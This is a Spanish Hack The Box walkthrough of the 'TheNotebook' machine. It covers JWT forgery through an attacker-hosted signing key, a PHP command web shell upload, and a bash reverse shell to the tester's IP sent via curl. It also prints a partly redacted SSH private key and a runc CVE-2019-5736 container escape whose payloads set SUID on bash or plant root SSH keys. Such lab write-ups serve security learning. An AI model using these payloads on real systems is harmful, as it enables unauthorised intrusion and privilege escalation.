
![](2022-07-01-09-32-18.png)
- #Author: José Luis Íñigo
- #Nickname: Riskoo
- #Machine notebook Hack the box
- #Skills: Abusing JWT (Gaining privileges) Abusing Upload File Docker Breakout [CVE-2019-5736 - RUNC] (Privilege Escalation)
- #Style: eWPT OSCP (Escalada) OSWE

# mapeo
10.10.14.9 es mi ip
10.10.10.230 es la ip de la máquina

Realizamos un ping para ver si estamos conectados a la máquina.

![](2022-07-01-09-37-27.png)

> Al ser u nttl de 63 ~ 64 se trata de una máquina linux

## Exploración de puertos abiertos

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.230 -oG allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:39 CEST
Initiating SYN Stealth Scan at 09:39
Scanning 10.10.10.230 [65535 ports]
Discovered open port 22/tcp on 10.10.10.230
Discovered open port 80/tcp on 10.10.10.230
Completed SYN Stealth Scan at 09:39, 12.91s elapsed (65535 total ports)
Nmap scan report for 10.10.10.230
Host is up, received user-set (0.080s latency).
Scanned at 2022-07-01 09:39:42 CEST for 13s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
> aparece como que hay otros cerrados y que aparece filtered, voy a probar evitando el firewall esto lo conseguimos con el parámetro -f que lo que hace es fragmentar los paquetes


```bash
nmap -f -Pn 10.10.10.230

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:44 CEST
Nmap scan report for 10.10.10.230
Host is up (0.056s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi
```
Aparece el 10010 como rxapi

> He estado buscando por encima en google y no encuentro una deficinión clara de que es lo que es rxapi. En principio parece un servidor de expresiones regulares el cual tiene también un cliente. 

https://github.com/warlock/rxapi

Aquí está el proyecto rxapi https://rxapi.js.gl/


## Ferobuxter para ver directorios
```bash
feroxbuster - u http://10.10.10.230
```

![](2022-07-01-12-07-33.png)

>admin,login,logout,register

## examinar la web con burpsuite activado

En mi burpsuite tengo una extensión que se llama jwt editor que te marca cuando aparece un jwt. Se instala desde BAPP aunque también podrías ir uno a uno mirando.

![](2022-07-01-12-10-41.png)

Tenemos un jwt que guardamos en un token

auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impvc2UiLCJlbWFpbCI6Impvc2VAam9zZS5lcyIsImFkbWluX2NhcCI6MH0.optYThyeK7xmKyfVQ5gR6hzqO_VgsxaQZePCmYonYstZNMjh_w4abLNZlV6IPD4HHiFxXdlol1-9y9GkcUAgcKpGNWQCFIziZddzaP5IAY2u-KoG7meAjDrWNMSEdXCi9sT7RZgP5doTBmxFTCFvuGC5He_sBr4Oz-fgIue2-H2iBdmh94oBVzh3e_Y5-NL8sIb1cMR45Jlv0qQtJ6zsnE_Csfk97NOGOGsQO9TR3OzeKYNdMJSL92MxlNDUTwGjjcXDylrdyNmvHTbv2KX_D8QzuO18XcwxJpP-fdtz3K9fXZB1rQeDalKadFUZNCSBPLyqfXK1AlYl6r4z6C11OB3wX26kGF003bpEw5eut3aLQtPExi3hndCoRHaxSPcgPoTECA-EsjCetEIJ4QscuXG7sq_QOjTHQ5kijKO_wYMQ_f99DMsmUhi6uMLAxz3nONw1IvSJ93NSt62IUn8sXLkvbYFdan1WNMY1Uo5L_Usghf6Uba2vWSFuJ0GNxx1PGeYEcmOD5GWIkTbJ42Xurft6zpyz6v7kyy0pSgT6LsBS03ZNl1KNvFjrGio7tQjmmjk1yJhNNsWxaiqTcyLOcNMR95DSRUShQKmM4FV_MkAkuE0TZa1RAgsv0KVn1xYXb7_d0X8aHpYwd1XFg8XiCLh0g-ht_BNLGmwyk4dEM5s

uuid=c11878ca-8750-47f2-9fcf-c33a0e63f917



## Desde burpsuite podemos ir a target y ver los posibles problemas que tiene la web


 ![](2022-07-01-12-26-02.png)


## Comprobamos en jwt.io cuando por url kid pide una private key
> Vemos que coge desde localhost una private key. 


![](2022-07-01-14-48-12.png)

En este caso vamos a hemos hecho lo siguiente

1. openssl genrsa -out priv.key 2048 para generar en nuestro servidor una private key
2. en la misma carpeta donde esté la private key creamos un con python un servidor
   ```python
   python3 -m http.server 443
   ```
3. Sustituimos en elos parámetros : 
    * kid => por nuestra ip:puerto/priv.key (que es la key que hicimos antes)
    * admin_cap ==> por 1 para así ser administrador
    * Añadimos nuestra private key abajo

Para hacer esto hemos tenido la pista de la priv.key , el admin_cap por lo que es una buena idea probar esto pronto.

![](2022-07-01-15-03-02.png)

Ahora podemos ir a admin

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC45OjQ0My9wcml2LmtleSJ9.eyJ1c2VybmFtZSI6ImxvbG8iLCJlbWFpbCI6ImxvbG9AbG9sby5lcyIsImFkbWluX2NhcCI6MX0.H9WMitXHgRuCFA6Ny2t6c9Sy735wPtE-wDQ8ZHzvPXM1eUMwZYbM4IVMw9rbBX6ltNPfrrSoTs0gCRZUxybt0Su0EqKHGISoURGyR4BslaPmLGN0yGGW60Rj66uUjmLDt7vq3RyMZQ8GpMMVLf0ij3xTdqKAROl53FFs0owYZvPrAxBDm_xXmM39jKIZrVCUpiLar9Owr7DrMcoRVmoT_CHQemAHae0Inf1XaKeDp_4FXz0wFELL7q5rFiNr-QrzPceWvYPCl5knbRQW3bEGgdRtlW5CqJZaIk5jv_eH1yy-jnecEn07wNdxzJVd7d-qWLeG7J_ywlkJ1Q7xM_cacA

lolo
lolo
lolo@lolo.es

Bien una vez dentor exploramos de nuevo la web. 

Hay varias cosas interesantes la primera que viene un log de notas en el que entre otras cosas aparece:
  - una historia con un nombre
  - se realiza un backup

La segunda nos deja subir un archivo. Primero subo una imagen , esa imagen se guarda pero cuando entro da fallo.
Ahora subo el php que siempre usamos con el cmd para ver si nos da algún tipo de problemas para entrar.

```bash
<?php system($_REQUEST["cmd"]); ?>
```
Una vez capturamos la entrada cambiamos como siempre por ?cmd=whoami para ver que pasa

![](2022-07-01-19-27-21.png)

No hemos tenido que hacer mucho, por lo que ahora mediante un curl mandaremos la revert shell

Importante mientras creaba la revertshell con el curl ha desapareido mi 

```bash
#antes me pongo en escucha en otra terminal

nc -lnvp 444

bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1

Modificamos el curl básico con revert shell a nuestras especificaciones

curl -s -G http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.9/444 0>&1'" 
```
![](2022-07-01-19-48-41.png)

Muchas veces tenemos que cambiar lo ' por " 

## Ahora preparamos nuestra bash

```bash
script /dev/null -c bash

#Con control+z dejamos de escuchar el puerto

#posteriormente hacemos un

stty raw -echo; fg

# Con esto hemos conseguido reiniciar la configuración de la terminal en bash
reset xterm

#control l para limpiar no funciona pero porque puede valer diferente a xterm
export TERM=xterm

#miramos cuando vale la variable shell y hacemos que valga una bash

export SHELL=/bin/bash

#ver el número de columnas y filas
stty size

#poner el número de filas y columnas  como en mi pc 61 236
stty rows 61 columns 236

```

![](2022-07-01-19-52-32.png)

Me las he dado de listo y nada , no tenemos permisos para leer user.txt

## Haciendo reconocimiento

He estado mirando varias cosas. Siempre que no encontremos nada por encima y sepamos que hay una copia de seguridad deberías buscar en /var/backups

He realizado un tar xf home.tar.gz y aunque no nos deja descomprimir aparece lo siguiente. un id_rsa

![](2022-07-01-20-06-19.png)

cat /home/noah/.ssh/id_rsa

Nos da problemas de permisos. Voy a crear un archivo temporal ponerlo ahí y descomprimir

### Crear carpeta temporal y pasar el archivo de backup
```bash
www-data@thenotebook:/var/backups$ mktemp -d
/tmp/tmp.CDxmqVJjB0
www-data@thenotebook:/var/backups$ ^C
www-data@thenotebook:/var/backups$ cd /tmp/tmp.CDxmqVJjB0
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ ls
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ cp /var/backups/home.tar.gz .
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ ls
home.tar.gz

```
### Descomprmir ver contenido y sobre todo id_rsa

```bash

www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ tar xf home.tar.gz 
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ ls
home  home.tar.gz
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0$ cd home
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home$ cd noah/     
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home/noah$ ls
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home/noah$ ls -la
total 32
drwxr-xr-x 5 www-data www-data 4096 Feb 17  2021 .
drwxr-xr-x 3 www-data www-data 4096 Feb 12  2021 ..
-rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc
drwx------ 2 www-data www-data 4096 Feb 16  2021 .cache
drwx------ 3 www-data www-data 4096 Feb 12  2021 .gnupg
-rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile
drwx------ 2 www-data www-data 4096 Feb 17  2021 .ssh
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home/noah$ cd .ssh
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home/noah/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
www-data@thenotebook:/tmp/tmp.CDxmqVJjB0/home/noah/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EvriwCrtrHo/ulwT
rLymqVz[...spoiler...]]zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAyyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpP2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----

```

ssh noah@10.10.10.230 -i id_rsa

![](2022-07-01-20-13-02.png)

# Escalada de privilegios

## Que puede ejecutar el usuario como sudo

```bash
noah@thenotebook:/usr/bin$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

noah@thenotebook:/usr/bin$ docker -v
Docker version 18.06.0-ce, build 0ffa825

```

Mirando en google docker y la versión veo esto https://gist.github.com/thinkycx/e2c9090f035d7b09156077903d6afa51
```bash
# Usage:
#       1. curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh
#       2. run docker_escape in docker container
```
Ejecuto el .1 pero como vimos no tengo permisos para el exterior, voy a bajarme el sh y ponerlo en mi servidor python3

He tenido que instalarme go

```bash

https://go.dev/dl/
tar xvzf go1.18.3.linux-amd64.tar.gz   

Una vez ya sabemos que go funciona, vamos a ver que exploit bash le vamos a meter. Para ello lo primero que se me ocurre es usar nuestra misma id_rsa de ante y pasarla como a /root/.ssh/Autorithedkeys

![](2022-07-01-21-36-49.png)

Por lo que sería algo así en el codigo de go
```bash
var payload = "#!/bin/bash \n cp /home/noah/.ssh/id_rsa /root/.ssh/authorized_keys" 
``` 
y una vez realizado poder conectarnos por ssh. Hay otras opciones como pasar mi ssh key a root para conectarnos por ssh

```bash
var payload = "#!/bin/bash \n mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys" 
```

Otra opción y la que vamos a usar es la de s4vitar. El motivo es que pormás que he probado tengo un problema con mi gccgo y pide dependencias exteriores, al estar bloqueado he mirado su video y el lo hace de otra forma que a mi siempre me sale lo siguiente cuando ejecuto el proceos del exploit que vimos de github. Como no quiero seguir perdiendo tiempo y prefiero hacer otra máquina pues copio lo que hace el. Recordad que el canal de s4vitar es https://www.youtube.com/watch?v=dekA2dzLSlE&ab_channel=S4viOnLive

```bash
root@0f4c2517af40:/tmp# ./exploit 
./exploit: error while loading shared libraries: libgo.so.21: cannot open shared object file: No such file or directory
```

El exploit lo que hace es que teniendo dos ssh abiertos con el usuario podemos ejecutar el docker , instalar y ejecutar el exploit y al volverlo a hacer , realiza el payload.

Una vez descargado de github el exploit https://gist.github.com/thinkycx/e2c9090f035d7b09156077903d6afa51 cambiamos el payload por 

```bash
var payload= "#!/bin/bash \n chmod u+s /bin/bash"
```
Con esto le damos a binbash el permiso u+s

Una vez hecho esto compilamos por go. Aquí es donde yo tengo problemas porque mi pc tiene instalado gccgo que mete unas librerías externas la cual no son accesibles desde el servidor atacado.

```bash
go build -ldflags "-s -w" main.go
mv main exploit
```
Una vez que tenemos el exploit , creamos un servidor python3 para descargarnos en noah el exploit en noah y le damos permisos de ejecución

```bash
chmod +x exploit
```
Como noah tiene python3 nos creamos un servidor python3 -m http.server 8081 . Todo esto en la primera consola.

Desde la segunda consola que tenemos también un ssh a noah entramos en el docker. Recordad que para ver lo que podíamos ejecutar 

```bash
sudo -l
#y nos aparece que podemos ejecutar sudo sin contraseña . Añadimos /bin/sh
/usr/bin/docker exec -it webapp-dev0 /bin/sh

#ejecutamos como sudo

sudo /usr/bin/docker exec -it webapp-dev0

# desde esta consola nos bajamos el exploit de noah. 

# Para ver la ip de noah
hostname -I

#ejecutamos en la carpeta /tmp
cd tmp
wget 17.17.0.1:8081/exploit

#una vez bajado le damos permiso de ejecución , recordad que estamos ya dentro del docker en la segunda terminal
chmod +x exploit

#ejecutamos exploit
./exploit

```
Consola 2

![](2022-07-02-09-35-01.png)

En la consola 1 nos metemos también en docker 
```bash
/usr/bin/docker exec -it webapp-dev0 /bin/sh
```

En consola 2 volvemos a ejecutar el exploit
./exploit

Recordad que esto último es copiado de s4vitar

![](2022-07-02-09-38-39.png)

con ls -l /bin/bash nos aparece que ya es u+s 

![](2022-07-02-09-39-52.png)

Con el comando bash -p ya somos root

![](2022-07-02-09-40-33.png)
